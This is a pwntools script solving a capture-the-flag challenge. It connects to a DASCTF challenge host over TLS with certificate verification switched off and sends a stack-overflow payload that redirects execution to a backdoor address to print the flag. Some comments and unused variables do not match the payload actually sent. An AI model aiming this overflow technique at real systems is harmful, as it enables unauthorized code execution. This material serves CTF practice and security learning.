from pwn import *
import ssl

# 手动创建一个 SSL 上下文，并关闭证书验证
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

host = "8775b11652ba4e9f26e7daa4.tcp-ctf2.dasctf.com"
port = 9999

print(f"[*] 正在连接 {host}:{port}...")
p = remote(host, port, ssl=True, ssl_context=ssl_context, sni=host)

# 后门地址（注意：要用 p64 打包成 8 字节的地址）
backdoor_addr = 0x401186

# 构造ret地址
ret_addr = 0x401185

# 构造 Payload: 24个垃圾字符 + 后门地址
payload = b'A' * 23 + p64(0x401198) + p64(0x401186)
# 发送攻击
p.sendline(payload)

result = p.recvall(timeout=3).decode('utf-8', errors='ignore')

# 用正则提取真正的 Flag
import re
flags = re.findall(r"CTF2\{[^}]+\}", result)
if flags:
    print(f"\n\n[🎉] GOT THE FLAG: {flags[0]}\n\n")
else:
    print("[-] Flag not found, here is the raw output:")
    print(result)